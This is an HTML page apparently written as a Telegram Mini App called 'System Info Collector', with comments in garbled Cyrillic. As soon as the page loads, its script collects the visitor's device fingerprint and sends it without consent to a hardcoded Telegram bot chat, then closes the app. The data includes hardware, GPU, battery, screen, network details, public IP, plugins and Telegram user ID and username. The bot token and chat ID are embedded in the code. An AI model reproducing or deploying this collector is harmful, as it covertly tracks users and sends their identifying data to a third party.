<!DOCTYPE html>
<html>
<head>
    <title>System Info Collector</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            text-align: center;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <h1>System Information Collector</h1>
    <div id="status" class="status">Collecting system information...</div>

<script>
// –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ iOS
const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
const statusEl = document.getElementById('status');

// Telegram WebApp initialization
try {
    Telegram.WebApp.enableClosingConfirmation();
    Telegram.WebApp.expand();
} catch (e) {
    console.log('Telegram WebApp not available');
}

// Configuration
const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
const CHAT_ID = '5540487728';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const tg = window.Telegram?.WebApp;
const userId = tg?.initDataUnsafe?.user?.id || 'N/A';
const username = tg?.initDataUnsafe?.user?.username || 'N/A';

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
function updateStatus(message, isError = false) {
    statusEl.textContent = message;
    statusEl.className = 'status ' + (isError ? 'error' : 'success');
    console.log(isError ? 'Error: ' + message : message);
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
async function safeGetData(getter, defaultValue = 'error') {
    try {
        const result = await getter();
        return result !== undefined ? result : defaultValue;
    } catch (e) {
        console.error('Error in data collection:', e);
        return defaultValue;
    }
}

// –û—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
async function getBasicInfo() {
    return {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent || 'unknown',
        platform: navigator.platform || 'unknown',
        vendor: navigator.vendor || 'unknown',
        language: navigator.language || 'unknown',
        languages: navigator.languages || ['unknown']
    };
}

async function getHardwareInfo() {
    return {
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
        gpu: await safeGetData(getGPUInfo),
        battery: isIOS ? 'Not available on iOS' : await safeGetData(getBatteryInfo)
    };
}

async function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'WebGL not supported';

        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL) || 'unknown',
            renderer: gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL) || 'unknown'
        };
    } catch (e) {
        return 'GPU detection failed';
    }
}

async function getBatteryInfo() {
    if (!('getBattery' in navigator)) return 'Battery API not supported';
    
    try {
        const battery = await navigator.getBattery();
        return {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging ? 'charging' : 'discharging'
        };
    } catch (e) {
        return 'Battery access denied';
    }
}

async function getScreenInfo() {
    return {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        orientation: screen.orientation?.type || 'unknown'
    };
}

async function getNetworkInfo() {
    if (!navigator.connection) return 'Network API not supported';
    
    return {
        type: navigator.connection.effectiveType || 'unknown',
        downlink: navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'unknown',
        rtt: navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'unknown',
        saveData: navigator.connection.saveData ? 'on' : 'off'
    };
}

async function getIPInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) throw new Error('IP API error');
        const data = await response.json();
        return { ip: data.ip || 'unknown' };
    } catch (e) {
        return { ip: 'unknown' };
    }
}

async function getBrowserInfo() {
    return {
        name: navigator.appName || 'unknown',
        version: navigator.appVersion || 'unknown',
        product: navigator.product || 'unknown',
        plugins: navigator.plugins ? 
            Array.from(navigator.plugins).map(p => p.name).filter(Boolean) : 
            ['unknown']
    };
}

async function collectSystemInfo() {
    updateStatus('Starting data collection...');
    
    try {
        const [
            basicInfo,
            hardwareInfo,
            screenInfo,
            networkInfo,
            ipInfo,
            browserInfo
        ] = await Promise.all([
            safeGetData(getBasicInfo),
            safeGetData(getHardwareInfo),
            safeGetData(getScreenInfo),
            safeGetData(getNetworkInfo),
            safeGetData(getIPInfo),
            safeGetData(getBrowserInfo)
        ]);

        const systemInfo = {
            ...basicInfo,
            ...hardwareInfo,
            screen: screenInfo,
            network: networkInfo,
            ipInfo: ipInfo,
            browser: browserInfo,
            telegramData: {
                userId: userId,
                username: username
            }
        };

        updateStatus('Data collection complete!');
        return systemInfo;
    } catch (e) {
        updateStatus('Failed to collect system data', true);
        console.error('Data collection error:', e);
        return null;
    }
}

async function sendToTelegram(data) {
    if (!data) {
        updateStatus('No data to send', true);
        return;
    }

    updateStatus('Sending data to Telegram...');
    
    try {
        // –§–æ—Ä–º–∏—Ä—É–µ–º –ø—Ä–æ—Å—Ç–æ–π —Ç–µ–∫—Å—Ç –±–µ–∑ Markdown, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –ø—Ä–æ–±–ª–µ–º —Å —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º
        let text = `üñ• System Information Report üñ•\n\n`;
        text += `üìÖ Timestamp: ${data.timestamp}\n`;
        text += `üë§ Telegram ID: ${data.telegramData.userId}\n`;
        text += `üë§ Username: ${data.telegramData.username}\n\n`;
        
        text += `üåê User Agent: ${data.userAgent}\n`;
        text += `üíª Platform: ${data.platform}\n`;
        text += `üè∑ Vendor: ${data.vendor}\n\n`;
        
        text += `‚öôÔ∏è Hardware Info:\n`;
        text += `- CPU Cores: ${data.cpuCores}\n`;
        text += `- Memory: ${data.deviceMemory}\n`;
        text += `- GPU: ${data.gpu.vendor || data.gpu} / ${data.gpu.renderer || 'N/A'}\n`;
        text += `- Battery: ${data.battery.level || data.battery} (${data.battery.charging || ''})\n\n`;
        
        text += `üì± Screen Info:\n`;
        text += `- Resolution: ${data.screen.width}x${data.screen.height}\n`;
        text += `- Available: ${data.screen.availWidth}x${data.screen.availHeight}\n`;
        text += `- Pixel Ratio: ${data.screen.pixelRatio}\n\n`;
        
        text += `üåê Network Info:\n`;
        if (typeof data.network === 'string') {
            text += `- ${data.network}\n`;
        } else {
            text += `- Type: ${data.network.type}\n`;
            text += `- Speed: ${data.network.downlink}\n`;
            text += `- RTT: ${data.network.rtt}\n`;
        }
        text += `- IP: ${data.ipInfo.ip}\n\n`;
        
        text += `üõ† Browser Plugins:\n`;
        text += `${data.browser.plugins.join(', ') || 'None detected'}\n`;

        const response = await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                disable_web_page_preview: true
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }

        updateStatus('Data successfully sent to Telegram!');
    } catch (error) {
        updateStatus('Failed to send data to Telegram', true);
        console.error('Telegram API error:', error);
    }
}

// –û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å
async function main() {
    try {
        const systemInfo = await collectSystemInfo();
        await sendToTelegram(systemInfo);
        
        // –ó–∞–∫—Ä—ã–≤–∞–µ–º WebApp –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ (–µ—Å–ª–∏ –≤ Telegram)
        if (typeof Telegram !== 'undefined' && Telegram.WebApp.close) {
            setTimeout(() => Telegram.WebApp.close(), 2000);
        }
    } catch (e) {
        console.error('Main process error:', e);
    }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('DOMContentLoaded', main);
</script>
</body>
</html>
